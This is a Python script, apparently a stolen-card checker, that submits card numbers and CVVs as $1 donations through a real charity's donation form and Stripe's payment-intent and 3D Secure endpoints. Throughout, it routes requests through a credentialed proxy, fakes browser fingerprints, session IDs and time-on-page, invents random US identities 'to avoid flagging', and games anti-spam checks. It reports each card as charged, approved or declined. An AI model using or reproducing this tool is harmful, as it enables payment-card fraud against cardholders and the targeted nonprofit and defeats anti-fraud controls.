import requests
import json
import base64
import logging
import re
import uuid
import random
import time

def process_st_charge(cc_num, exp_month, exp_year, cvv):
    """
    Processes a card charge via the Yadchaya Stripe gateway.
    Returns a dictionary: {'status': 'charged'|'declined'|'error', 'message': '...', 'decline_code': '...'}
    """
    
    # Basic formatting
    if len(exp_year) == 4:
        exp_year = exp_year[2:]

    # ==========================================
    # PROXY CONFIGURATION
    # ==========================================
    proxy_url = 'http://5K05CT880J2D:VE1MSDRGFDZB@37.218.219.8:5433'
    proxies = {
        'http': proxy_url,
        'https': proxy_url
    }

    # ==========================================
    # DYNAMIC DATA GENERATION (Anti-Captcha)
    # ==========================================
    
    # Generate Fresh Session IDs for Stripe Fingerprinting
    session_mid = str(uuid.uuid4())
    session_sid = str(uuid.uuid4())
    client_session_id = str(uuid.uuid4())
    elements_session_id = f"elements_session_{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=8))}"
    elements_config_id = str(uuid.uuid4())
    guid_id = f"{str(uuid.uuid4())}{''.join(random.choices('0123456789abcdef', k=6))}"
    
    # Randomize Time on Page (between 30s and 120s)
    time_on_page = str(random.randint(30000, 120000))
    
    # Live timestamp for Akismet Anti-Spam (ak_js)
    ak_js_timestamp = str(int(time.time() * 1000))

    # Generate Fresh US PII to avoid flagging
    first_names = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda", "David", "Elizabeth", "William", "Barbara"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Anderson", "Taylor"]
    streets = ["123 Main St", "456 Oak Ave", "789 Pine Rd", "321 Elm Blvd", "654 Maple Dr", "987 Cedar Ln"]
    cities_states_zips = [
        ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), 
        ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"), 
        ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101")
    ]

    f_name = random.choice(first_names)
    l_name = random.choice(last_names)
    addr = random.choice(streets)
    city, state, zip_code = random.choice(cities_states_zips)
    email = f"{f_name.lower()}{l_name.lower()}{random.randint(10, 999)}@gmail.com"

    # ==========================================
    # STEP 0: Fetch Fresh Nonce
    # ==========================================
    
    cookies_initial = {
        '__stripe_mid': session_mid,
        '__stripe_sid': session_sid,
    }

    # Updated to a realistic current Chrome version
    headers_initial = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'sec-ch-ua': '"Chromium";v="126", "Not-A.Brand";v="24", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    fresh_nonce = None

    try:
        response_initial = requests.get(
            'https://yadchaya.com/donate/', 
            cookies=cookies_initial, 
            headers=headers_initial, 
            proxies=proxies,
            timeout=20
        )
        
        html_content = response_initial.text
        pattern = r'var\s+gforms_stripe_frontend_strings\s*=\s*(\{.*?\});'
        match = re.search(pattern, html_content)

        if match:
            json_str = match.group(1)
            try:
                stripe_strings = json.loads(json_str)
                fresh_nonce = stripe_strings.get('validate_form_nonce')
                
                if not fresh_nonce:
                    return {'status': 'error', 'message': 'Nonce value empty in extracted JSON', 'decline_code': 'nonce_empty'}
            except json.JSONDecodeError as e:
                return {'status': 'error', 'message': 'Invalid JSON format for stripe strings', 'decline_code': 'nonce_json_error'}
        else:
            return {'status': 'error', 'message': 'Nonce pattern not found in HTML', 'decline_code': 'nonce_missing'}

    except Exception as e:
        return {'status': 'error', 'message': f'Step 0 Exception: {str(e)}', 'decline_code': 'request_error'}

    # ==========================================
    # STEP 1: Validate Form via AJAX
    # ==========================================

    headers_step1 = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'origin': 'https://yadchaya.com',
        'pragma': 'no-cache',
        'referer': 'https://yadchaya.com/donate/',
        'sec-ch-ua': '"Chromium";v="126", "Not-A.Brand";v="24", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    # Injecting all fresh PII and dynamic timestamps here
    files = {
        'input_1.3': (None, f_name),
        'input_1.6': (None, l_name),
        'input_3': (None, email),
        'input_4': (None, '$1.00'),
        'input_5': (None, 'General Donation'),
        'input_8.1': (None, addr),
        'input_8.3': (None, city),
        'input_8.4': (None, state),
        'input_8.5': (None, zip_code),
        'input_8.6': (None, 'US'), # Matched to US addresses
        'input_14': (None, '0.03'),
        'input_7': (None, ''),
        'input_9': (None, '$1.00'),
        'is_submit_3': (None, '1'),
        'gform_unique_id': (None, ''),
        'state_3': (None, 'WyJbXSIsImMzODVmN2JhMGRkZDZmMDM0MjY1ZDg2NjQ5Y2RhYzA5Il0='),
        'gform_target_page_number_3': (None, '0'),
        'gform_source_page_number_3': (None, '1'),
        'gform_field_values': (None, ''),
        'ak_hp_textarea': (None, ''), # Honeypot, MUST be empty
        'ak_js': (None, ak_js_timestamp), # DYNAMIC TIMESTAMP
        'version_hash': (None, 'a721064c09d0d091953b5ea438a79ecc'),
        'action': (None, 'gfstripe_validate_form'),
        'feed_id': (None, '5'),
        'form_id': (None, '3'),
        'tracking_id': (None, 'placeholder'), 
        'payment_method': (None, 'card'),
        'nonce': (None, fresh_nonce),
    }

    try:
        response_step1 = requests.post(
            'https://yadchaya.com/wp-admin/admin-ajax.php', 
            cookies=cookies_initial, 
            headers=headers_step1, 
            files=files,
            proxies=proxies,
            timeout=20
        )
        
        resp_step1_json = response_step1.json()

        if not isinstance(resp_step1_json, dict) or not resp_step1_json.get('success'):
            return {'status': 'error', 'message': 'Step 1 Validation Failed', 'decline_code': 'validation_error'}

        data = resp_step1_json.get('data')
        intent = data.get('intent')
        
        intent_id = intent.get('id')
        client_secret = intent.get('client_secret')
        resume_token = data.get('resume_token')
        tracking_id = data.get('tracking_id')
        
        if not intent_id or not client_secret:
            return {'status': 'error', 'message': 'Missing Intent Details', 'decline_code': 'intent_error'}

    except Exception as e:
        return {'status': 'error', 'message': f'Step 1 Exception: {str(e)}', 'decline_code': 'request_error'}

    # ==========================================
    # STEP 2: Confirm Payment Intent (Stripe)
    # ==========================================

    headers_step2 = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="126", "Not-A.Brand";v="24", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    # Constructing payload directly as a dictionary for clean dynamic injection
    data_dict = {
        'payment_method_data[billing_details][address][line1]': addr,
        'payment_method_data[billing_details][address][line2]': '',
        'payment_method_data[billing_details][address][city]': city,
        'payment_method_data[billing_details][address][state]': state,
        'payment_method_data[billing_details][address][postal_code]': zip_code,
        'payment_method_data[billing_details][address][country]': 'US',
        'payment_method_data[billing_details][email]': email,
        'payment_method_data[type]': 'card',
        'payment_method_data[card][number]': cc_num,
        'payment_method_data[card][cvc]': cvv,
        'payment_method_data[card][exp_year]': exp_year,
        'payment_method_data[card][exp_month]': exp_month,
        'payment_method_data[allow_redisplay]': 'unspecified',
        'payment_method_data[payment_user_agent]': 'stripe.js/1ad8215204; stripe-js-v3/1ad8215204; payment-element; deferred-intent; autopm',
        'payment_method_data[referrer]': 'https://yadchaya.com',
        'payment_method_data[time_on_page]': time_on_page, # DYNAMIC
        'payment_method_data[client_attribution_metadata][client_session_id]': client_session_id, # DYNAMIC
        'payment_method_data[client_attribution_metadata][merchant_integration_source]': 'elements',
        'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': 'payment-element',
        'payment_method_data[client_attribution_metadata][merchant_integration_version]': '2021',
        'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': 'deferred',
        'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': 'automatic',
        'payment_method_data[client_attribution_metadata][elements_session_id]': elements_session_id, # DYNAMIC
        'payment_method_data[client_attribution_metadata][elements_session_config_id]': elements_config_id, # DYNAMIC
        'payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]': 'payment',
        'payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][1]': 'linkAuthentication',
        'payment_method_data[guid]': guid_id, # DYNAMIC
        'payment_method_data[muid]': session_mid, # MATCHES COOKIE
        'payment_method_data[sid]': session_sid, # MATCHES COOKIE
        'expected_payment_method_type': 'card',
        'client_context[currency]': 'usd',
        'client_context[mode]': 'payment',
        'client_context[capture_method]': 'automatic',
        'client_context[payment_method_options][us_bank_account][verification_method]': 'instant',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_51JUzeeIoxPgKlQw5B3QMm0mRo4lT1N3B7H2SwIUh8boP7Ykya5IZ1ric4emzMjoeF2beLBWPJc5ogK5GPiJ10CUI005ikoy31r'
    }

    return_url = f'https://yadchaya.com/donate/?resume_token={resume_token}&feed_id=5&form_id=3&tracking_id={tracking_id}'
    data_dict['return_url'] = return_url
    data_dict['client_secret'] = client_secret

    step2_url = f'https://api.stripe.com/v1/payment_intents/{intent_id}/confirm'

    try:
        response_step2 = requests.post(step2_url, headers=headers_step2, data=data_dict, proxies=proxies, timeout=20)
        resp_json = response_step2.json()

        if 'error' in resp_json:
            error_info = resp_json['error']
            msg = error_info.get("message", "Unknown Error")
            code = error_info.get("decline_code", "rejected")
            
            if code == 'insufficient_funds':
                return {"status": "approved", "message": msg, "decline_code": code}
            return {"status": "declined", "message": msg, "decline_code": code}

        elif resp_json.get('status') == 'succeeded':
            return {"status": "charged", "message": "Your payment was successful", "decline_code": "succeeded"}

        elif resp_json.get('status') == 'requires_action' and 'next_action' in resp_json:
            use_stripe_sdk = resp_json['next_action'].get('use_stripe_sdk', {})
            source = use_stripe_sdk.get('three_d_secure_2_source')
            server_trans_id = use_stripe_sdk.get('server_transaction_id')
            
            if source and server_trans_id:
                # ==========================================
                # STEP 3: 3D Secure Authentication
                # ==========================================
                
                fingerprint_inner = {"threeDSServerTransID": server_trans_id}
                fingerprint_data_b64 = base64.b64encode(json.dumps(fingerprint_inner).encode()).decode()
                
                # Randomized browser data to match the fresh session
                browser_data = {
                    "fingerprintAttempted": True,
                    "fingerprintData": fingerprint_data_b64,
                    "challengeWindowSize": None,
                    "threeDSCompInd": "Y",
                    "browserJavaEnabled": False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage": "en-US",
                    "browserColorDepth": "32",
                    "browserScreenHeight": str(random.choice([1920, 1080, 864, 720])),
                    "browserScreenWidth": str(random.choice([1080, 1920, 1536, 1280])),
                    "browserTZ": str(random.choice([-300, -360, -420, -480])), # Random US Timezones
                    "browserUserAgent": headers_step2['user-agent']
                }
                
                data_step3 = {
                    'source': source,
                    'browser': json.dumps(browser_data),
                    'one_click_authn_device_support[hosted]': 'false',
                    'one_click_authn_device_support[same_origin_frame]': 'false',
                    'one_click_authn_device_support[spc_eligible]': 'true',
                    'one_click_authn_device_support[webauthn_eligible]': 'true',
                    'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
                    'key': 'pk_live_51JUzeeIoxPgKlQw5B3QMm0mRo4lT1N3B7H2SwIUh8boP7Ykya5IZ1ric4emzMjoeF2beLBWPJc5ogK5GPiJ10CUI005ikoy31r'
                }

                response_step3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_step2, data=data_step3, proxies=proxies, timeout=20)
                resp_step3 = response_step3.json()
                
                if resp_step3.get('state') == 'challenge_required':
                    return {"status": "declined", "message": "Your card need additional verification", "decline_code": "payment_intent_authentication_failure"}
                else:
                    return {"status": "declined", "message": "3DS Flow Incomplete or Failed", "decline_code": "3ds_incomplete"}
            else:
                return {'status': 'error', 'message': '3DS Data Missing', 'decline_code': '3ds_error'}

        else:
            return {'status': 'error', 'message': 'Unknown Gateway State', 'decline_code': 'unknown'}

    except Exception as e:
        logging.error(f"ST Charge Step 2/3 Error: {e}")
        return {'status': 'error', 'message': f'Process Exception: {str(e)}', 'decline_code': 'request_error'}
